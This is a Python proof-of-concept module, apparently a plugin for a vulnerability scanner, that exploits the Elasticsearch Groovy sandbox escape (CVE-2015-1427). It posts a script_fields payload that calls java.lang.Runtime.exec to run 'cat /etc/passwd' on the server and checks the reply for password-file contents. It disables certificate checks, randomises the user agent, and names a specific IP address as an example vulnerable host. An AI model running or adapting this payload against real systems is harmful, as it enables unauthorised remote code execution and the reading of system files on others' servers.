# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
import json  
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-08",        # POC创建时间
    "UpdateDate" : "2021-06-08",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "ElasticSearch 代码执行漏洞（CVE-2015-1427）",                        # 漏洞名称
    "AppName" : "Elasticsearch",                     # 漏洞应用名称
    "AppVersion" : "",                  # 漏洞应用版本
    "VulnDate" : "2020-12-29",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
    "VulnDesc" : """
    新版本中Elasticsearch将默认的脚本语言换成了Groovy，增加了沙盒机制过滤用户输入，但还是具有执行漏洞的方法
    """,                                # 漏洞简要描述

    "fofa-dork":"",                     # fofa搜索语句
    "example" : "http://207.192.69.193:9200",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 10,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    
    host = host.replace("elastic://","http://")
    url = url_handle(host) + "/website/blog/" # url自己按需调整
    url1 = url_handle(host) + "/_search?pretty" # url自己按需调整
    # print(url)
    
    headers = {"User-Agent":get_random_ua(),
                "Connection":"close",
                "Content-Type": "application/x-www-form-urlencoded",
                }
    headers1 = {"User-Agent":get_random_ua(),
                "Connection":"close",
                "Content-Type": "application/text",
                }
    data = "{\"name\": \"test\"}"
    data1 = """{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"cat /etc/passwd\\").getText()"}}}"""
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.post(url = url, data = data , headers = headers , proxies = proxy , timeout = _info["timeout"],verify = False)
        req1 = requests.post(url = url1, data = data1 , headers = headers1 , proxies = proxy , timeout = _info["timeout"],verify = False)
        # if req.status_code == 200:
        if req1.status_code == 200 and "root:/root" in req1.text :
            vuln = [True,req1.text]
        else:
            vuln = [False,req1.text]
    except Exception as e:
        raise e
    
    return vuln


